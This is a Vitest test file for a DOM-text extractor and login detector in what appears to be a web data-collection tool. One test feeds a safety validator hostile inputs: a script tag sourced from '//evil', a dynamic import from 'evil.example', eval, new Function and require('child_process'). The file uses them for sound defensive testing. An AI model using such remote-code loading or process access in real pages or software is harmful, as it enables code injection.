import { describe, expect, it } from 'vitest';
import { assertDomScriptSafe, buildDefaultDomScript, runDomScript } from '../../src/main/collect/dom-extractor';
import { CollectError } from '../../src/main/collect/errors';
import { buildLoginDetectScript, parseLoginDetect } from '../../src/main/collect/login-detector';

describe('DOM 提取安全（AC：仅静态脚本读取文本，无 eval/Function/远程脚本注入）', () => {
  it('合法静态表达式通过', () => {
    expect(() => assertDomScriptSafe("document.querySelector('.q')?.textContent")).not.toThrow();
    expect(() => assertDomScriptSafe("'12.34 / 37.66'")).not.toThrow();
  });

  it('eval / new Function / <script> / import() / require 被拒绝', () => {
    expect(() => assertDomScriptSafe('eval("1+1")')).toThrow(CollectError);
    expect(() => assertDomScriptSafe('new Function("return 1")()')).toThrow(CollectError);
    expect(() => assertDomScriptSafe('document.write("<script src=//evil></script>")')).toThrow(CollectError);
    expect(() => assertDomScriptSafe('import("https://evil.example/x.js")')).toThrow(CollectError);
    expect(() => assertDomScriptSafe('require("child_process")')).toThrow(CollectError);
  });

  it('runDomScript 解析 JSON 返回文本；__DOM_MISS__ 转为 missedSelectors；脚本错误抛出', async () => {
    const r1 = await runDomScript(async () => JSON.stringify({ text: 'used=12.34' }), "'x'");
    expect(r1).toEqual({ text: 'used=12.34', missedSelectors: [] });
    const r2 = await runDomScript(async () => JSON.stringify({ text: '__DOM_MISS__:.a,.b' }), "'x'");
    expect(r2.missedSelectors).toEqual(['.a', '.b']);
    await expect(runDomScript(async () => JSON.stringify({ __dom_error: 'boom' }), "'x'")).rejects.toThrow('boom');
  });

  it('buildDefaultDomScript：内联 extractByText，命中返回 name=text 拼接', async () => {
    const script = buildDefaultDomScript([{ name: '已用', selector: '.used' }]);
    expect(script).toContain('querySelector');
    // 模拟页面执行结果
    const fakeExecute = async (): Promise<unknown> => JSON.stringify({ text: '已用=12.34' });
    const r = await runDomScript(fakeExecute, script);
    expect(r.text).toBe('已用=12.34');
  });
});

describe('登录检测脚本（AC：.auth-required「🔐 请手动登录」链路）', () => {
  it('parseLoginDetect 解析结果', () => {
    expect(parseLoginDetect(JSON.stringify({ loginRequired: true, url: 'https://x', title: '登录' }))).toEqual({
      loginRequired: true,
      url: 'https://x',
      title: '登录',
    });
    expect(parseLoginDetect('not json').loginRequired).toBe(false);
  });

  it('buildLoginDetectScript 包含自定义选择器与兜底规则', () => {
    const s = buildLoginDetectScript('.login-wall');
    expect(s).toContain('.login-wall');
    expect(s).toContain('password');
  });
});
